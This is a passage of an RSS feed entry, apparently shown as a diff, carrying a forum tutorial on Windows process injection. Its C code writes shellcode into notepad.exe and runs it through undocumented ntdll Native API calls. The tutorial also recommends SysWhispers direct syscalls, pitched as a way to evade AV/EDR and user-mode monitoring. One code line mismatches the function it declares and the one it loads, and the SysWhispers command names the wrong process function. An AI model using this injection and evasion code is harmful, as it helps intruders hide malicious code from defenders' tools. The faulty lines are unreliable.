+<pre><code class="lang-auto">x86_64-w64-mingw32-gcc main.c -o rti.exe
+</code></pre>
+<p>we send the output to our windows machine and run it. if we open  <strong>process hacker</strong>  and take a look at the  <strong>notepad.exe</strong>  process. in the memory section there is only one memory page with RWX permission which is suspicious. if we open it we can see our shellcode inside it.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85.png" data-download-href="/uploads/short-url/effXrKa174oyvibfBufispBnHCJ.png?dl=1" title="process-hacker-notepad" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_501x500.png" alt="process-hacker-notepad" data-base62-sha1="effXrKa174oyvibfBufispBnHCJ" width="501" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_501x500.png, https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_751x750.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_1002x1000.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_10x10.png"></a></div><br>
+<em>image 1</em><p></p>
+<h2>Native API</h2>
+<h3>pros:</h3>
+<ul>
+<li>bypass some of the AV/EDRs</li>
+</ul>
+<h3>cons:</h3>
+<ul>
+<li>hard to use</li>
+<li>still detectable by most AV/EDRs</li>
+<li>may not work on all windows versions</li>
+</ul>
+<p>In order to interact with the operating system, programmers use Standard APIs (Win 32 APIs) that are recommended by Microsoft. Standard Windows APIs are a kind of wrapper for Native APIs. Native APIs or Undocumented APIs could be found in the ntdll.dll library. Microsoft doesn’t recommend using these APIs. if you look at the second diagram you can see how these APIs are working. native APIs also interact with os kernel using syscalls. Microsoft uses this architecture because it can change the OS kernel without affecting the standard APIs.</p>
+<p>Native APIs are also called undocumented APIs because you can’t usually find official documentats to use them. we can find a way of using them mostly by seeing other people’s code, unofficial documents, or researching around them to see how they work. most of these APIs names start with Nt or Zw.</p>
+<p>In the previous section, we used standard APIs to do our job. here we go one layer deeper and use native APIs. we have a couple of more steps to use NTAPIS. for using Native APIs. first, we need to load the ntdll.dll into our malware process. then we should define function pointers with the exact same format as the original function that we want to use, and export the base address of these functions to initialize these pointers.</p>
+<p>for loading ntdll.dll or any other dll dynamically into our running process, we use the <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw" rel="noopener nofollow ugc">LoadLibraryW</a> function and it returns a handle to that library.</p>
+<pre><code class="lang-auto">HMODULE hNtdll = LoadLibraryW(L"ntdll");
+</code></pre>
+<p>then we define our function pointer type and get the base address of the function using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress" rel="noopener nofollow ugc">GetProcAddress</a> function and assign it to the pointer. here is the example for <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess" rel="noopener nofollow ugc">NtOpenProcess</a>.</p>
+<pre><code class="lang-auto">typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
+pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
+</code></pre>
+<p>as you can see we defined our function type with the same parameters as the  <strong>NtOpenProcess</strong>  function. you should do this for all  <strong>NtWriteVirtualMemory</strong> ,  <strong>NtAllocateVirtualMemory</strong> ,  <strong>NtCreateThreadEx</strong>  functions. for finding the parameter and structure of an undocumented api you can use <a href="http://undocumented.ntinternals.net/" rel="noopener nofollow ugc">http://undocumented.ntinternals.net/</a>. but you may not find all the function definitions in it. you can search for it and see other people’s codes or even looking inside the ntdll.dll library to see how it exactly works.</p>
+<h3>NtOpenProcess</h3>
+<p>like the previous section, we start by opening our target process but this time using <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess" rel="noopener nofollow ugc">NtOpenProcess</a>. this function does not return a Handle to our target process but we need to pass a handle pointer as the first argument(pass by reference). we should also pass a pointer to an <a href="https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes" rel="noopener nofollow ugc">OBJECT_ATTRIBUTES</a> structure and a pointer to  <strong>Client ID</strong>  struct so let’s define them. we should also initialize  <strong>OBJECT_ATTRIBUTES</strong>  using <a href="https://docs.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes" rel="noopener nofollow ugc">InitializeObjectAttributes</a> macro and define  <strong>UNICODE_STRING</strong>  struct.</p>
+<pre><code class="lang-auto">#define InitializeObjectAttributes(p,n,a,r,s) { \
+(p)-&gt;Length = sizeof(OBJECT_ATTRIBUTES); \
+(p)-&gt;RootDirectory = (r); \
+(p)-&gt;Attributes = (a); \
+(p)-&gt;ObjectName = (n); \
+(p)-&gt;SecurityDescriptor = (s); \
+(p)-&gt;SecurityQualityOfService = NULL; \
+}
+
+typedef struct _CLIENT_ID
+{
+	PVOID UniqueProcess;
+	PVOID UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+
+typedef struct _OBJECT_ATTRIBUTES {
+	ULONG           Length;
+	HANDLE          RootDirectory;
+	PUNICODE_STRING ObjectName;
+	ULONG           Attributes;
+	PVOID           SecurityDescriptor;
+	PVOID           SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES ;
+
+
+OBJECT_ATTRIBUTES oa;
+InitializeObjectAttributes(&amp;oa, NULL,0,NULL,NULL);
+CLIENT_ID ci = { (HANDLE)procid, NULL };
+</code></pre>
+<p>now we can use  <strong>NtOpenProcess</strong></p>
+<pre><code class="lang-auto">NtOpenProcess(&amp;target_process_handle,PROCESS_ALL_ACCESS, &amp;oa, &amp;ci);
+</code></pre>
+<h3>NtAllocateVirtualMemory</h3>
+<p>we allocate memory in target process using the <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory" rel="noopener nofollow ugc">NtAllocateVirtualMemory</a> function. we define the function prototype.</p>
+<pre><code class="lang-auto">typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+</code></pre>
+<p>then we get the base address of the function.</p>
+<pre><code class="lang-auto">pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+</code></pre>
+<p>and we call it</p>
+<pre><code class="lang-auto">NtAllocateVirtualMemory(target_process_handle, &amp;remote_process_buffer, 0,&amp;buf_len ,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</code></pre>
+<p>we passed a void pointer named  <strong>remote_process_buffer</strong>  that will be the base address of the allocated space.</p>
+<h3>NtWriteVirtualMemory</h3>
+<p>we define <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html" rel="noopener nofollow ugc">NtWriteVirtualMemory</a> function prototype like previous steps. we should pass our shellcode, the length of the shellcode, and the base address of the allocated space as arguments.</p>
+<pre><code class="lang-auto">typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten OPTIONAL);
+pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+NtWriteVirtualMemory(target_process_handle, remote_process_buffer, buf, buf_len, NULL);
+</code></pre>
+<h3>NtCreateThreadEx</h3>
+<p>now it’s time to create a thread in our target process and run our shellcode. we use  <strong>NtCreateThreadEx</strong>  to create a remote thread in the target process and run our shellcode. we should pass 0 as the  <strong>CreateFlag</strong>  parameter to run the thread immediately after creation and 0x1FFFFF (PROCESS_ALL_ACCESS) as the  <strong>DesiredAccess</strong>  parameter. to see the function prototype, you can look <a href="https://github.com/processhacker/processhacker/blob/753a395d55634f5e5483c517219414c2ecacfc23/phnt/include/ntpsapi.h#L1814" rel="noopener nofollow ugc">here</a>.</p>
+<pre><code class="lang-auto">NtCreateThreadEx(&amp;thread_handle, 0x1FFFFF, NULL, target_process_handle,(LPTHREAD_START_ROUTINE)remote_process_buffer,NULL, FALSE, NULL, NULL, NULL, NULL);
+</code></pre>
+<p>that’s it for Native APIs. let’s go one step deeper and use syscalls.</p>
+<h2>Direct Syscalls</h2>
+<h3>pros:</h3>
+<ul>
+<li>undetectable by all of the API monitoring tools that work on user-space</li>
+</ul>
+<h3>cons:</h3>
+<ul>
+<li>May not work on all windows versions</li>
+<li>hard to use</li>
+</ul>
+<p>In the previous steps, any API monitoring application and EDRs could detect our API calls and ruin our operation. now if we use direct syscalls nothing in userland can detect our API calls. but as <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon" rel="noopener nofollow ugc">sysmon</a> works as a driver in kernel space we can’t do anything about it. so, it is strongly recommended to use sysmon.</p>
+<p>One of the disadvantages of using syscalls is that their work is dependent on the version of OS and our code may not work on different windows versions. However, by using a great tool like <a href="https://github.com/jthuraisamy/SysWhispers" rel="noopener nofollow ugc">SysWhisper</a> we can generate syscalls for different windows versions. you can run the following command to generate syscalls for our desired functions for windows 10.</p>
+<pre><code class="lang-auto">syswhispers.py --function NtCreateProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscall --versions 10
+</code></pre>
+<p>this command generates two output files  <strong>syscall.asm</strong>  and  <strong>syscall.h</strong>  that we add to our visual studio project. then we should enable <a href="https://docs.microsoft.com/en-us/cpp/assembler/masm/masm-for-x64-ml64-exe?view=msvc-160" rel="noopener nofollow ugc">MASM</a> in the project and include the header file in our main code.</p>
+<p>afterward using the functions is like Native APIs but here we don’t need to load ntdll.dll, get the base address of the functions, and defining function prototypes. I think SysWhisper has made it really easy to utilize syscalls.</p>
+<p>You can find the codes for this post on my <a href="https://github.com/AlionGreen/remote-thread-injection" rel="noopener nofollow ugc">Github</a>.</p>
+<h2>Credit:</h2>
+<p>thanks, <a href="https://twitter.com/0x00dtm" rel="noopener nofollow ugc">@0x00dtm</a> for guiding me through Native APIs and Syscalls. it would be much harder without his help.</p>
+<h2>References:</h2>
+<aside class="onebox allowlistedgeneric">
+  <header class="source">
+      
+      <a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/" target="_blank" rel="noopener nofollow ugc">outflank.nl</a>
+  </header>
+  <article class="onebox-body">
+    
+
+<h3><a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/" target="_blank" rel="noopener nofollow ugc">Red Team Tactics: Combining Direct System Calls and sRDI to bypass AV/EDR |...</a></h3>
+
+<p>In this blog post we will explore the use of direct system calls, restore hooked API calls and ultimately combine this with a shellcode injection technique called&nbsp;sRDI. We will combine these techniques in proof of concept code which can be used...</p>
+
+
+  </article>
+  <div class="onebox-metadata">
+    
+    
+  </div>
+  <div style="clear: both"></div>
+</aside>
+
+<p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-injection/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.ired.team/offensive-security/code-injection-process-injection/process-injection/</a></p>
+<aside class="onebox allowlistedgeneric">
+  <header class="source">
+      <img src="https://0x00sec.s3.amazonaws.com/original/3X/9/f/9f230528ee350a1335deb4fe0b3db3b3c25fa147.png" class="site-icon" width="200" height="200">
+      <a href="https://blog.dylan.codes/defending-your-malware/" target="_blank" rel="noopener nofollow ugc" title="07:34PM - 11 August 2020">batsec – 11 Aug 20</a>
+  </header>
+  <article class="onebox-body">
+    <img src="" class="thumbnail" width="" height="">
+
+<h3><a href="https://blog.dylan.codes/defending-your-malware/" target="_blank" rel="noopener nofollow ugc">Defending Your Malware</a></h3>
+
+<p>Malware is an important part of an engagement, though as many security solutions are now evolving past rudimentary signature comparisons to using more advanced techniques to detect malicious activity, it is important that we as attackers understand...</p>
+
+
+  </article>
+  <div class="onebox-metadata">
+    
+    
+  </div>
+  <div style="clear: both"></div>
+</aside>
+
+          <p><a href="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/1</link>
+        <pubDate>Mon, 28 Dec 2020 19:44:05 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-24399-1</guid>
+        <source url="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399.rss">Process Injection: Remote Thread Injection or CreateRemoteThread</source>
+      </item>
+  </channel>
+</rss>
